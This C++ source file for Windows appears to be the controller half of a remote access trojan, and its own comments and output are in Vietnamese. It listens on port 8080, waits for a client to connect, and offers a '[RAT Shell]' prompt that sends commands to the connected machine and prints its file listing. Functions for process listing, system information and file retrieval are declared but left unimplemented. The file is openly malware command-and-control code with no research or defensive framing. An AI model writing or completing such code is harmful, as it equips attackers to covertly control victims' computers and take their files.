#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <fstream>
#include <string>
#include <windows.h>
#include <io.h>

#pragma comment(lib, "Ws2_32.lib")

const int BUFFER_SIZE = 4096;



class SocketClient {
public:
    SOCKET socket;
    void Send(const std::string&);
    std::string Receive();
    std::string ReceiveUntilTimeout(DWORD);
};

void SocketClient::Send(const std::string& msg){
    send(socket, msg.c_str(), static_cast<int>(msg.size()), 0);
}

std::string SocketClient::Receive() {
    char buffer[BUFFER_SIZE]{};

    int bytes = recv(socket, buffer, BUFFER_SIZE, 0);

    if(bytes <= 0)
        return "";

    return std::string(buffer, bytes);
}

class RatServer {
public:
    void Start();

    ~RatServer()
    {
        if(clientSocket != INVALID_SOCKET)
            closesocket(clientSocket);

        if(serverSocket != INVALID_SOCKET)
            closesocket(serverSocket);

        WSACleanup();
    }

private:
    SocketClient client;
    SOCKET serverSocket{};
    SOCKET clientSocket{};

    void InitWinsock();
    void WaitForClient();
    void CommandLoop();

    void HandleCommand(const std::string& input);
    
    void ListFile();
    void ListProcess();
    void ReceiveStatus();

    void SendFileContent(std::string& filename);

    void SysInfo();
};

void RatServer::Start() {
    InitWinsock();
    WaitForClient();
    CommandLoop();
}

void RatServer::InitWinsock() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, SOMAXCONN);

    std::cout << "[*] Server dang lang nghe tai cong 8080...\n";
}

void RatServer::WaitForClient() {
    client.socket = accept(serverSocket, nullptr, nullptr);
    std::cout << "[+] Co Client ket noi vao!\n";
}

void RatServer::CommandLoop() {
    std::string input;

    while (true) {
        std::cout << "\n[RAT Shell]> ";
        std::getline(std::cin, input);
        if (input.empty()) continue;
        if (input == "EXIT") break;
        
        // Gửi lệnh sang Client
        client.Send(input);

        HandleCommand(input);

    }
}

void RatServer::HandleCommand(const std::string& input) {
    char buffer[BUFFER_SIZE];

    if (input == "LIST") {
        ListFile();
    }
}

void RatServer::ListFile() {
    auto response = client.Receive();

    if(response.empty())
        return;

    std::cout << "\n--- Danh sach file cua Client ---\n";
    std::cout << response << std::endl;
}


int main() {
    RatServer server;
    server.Start();
}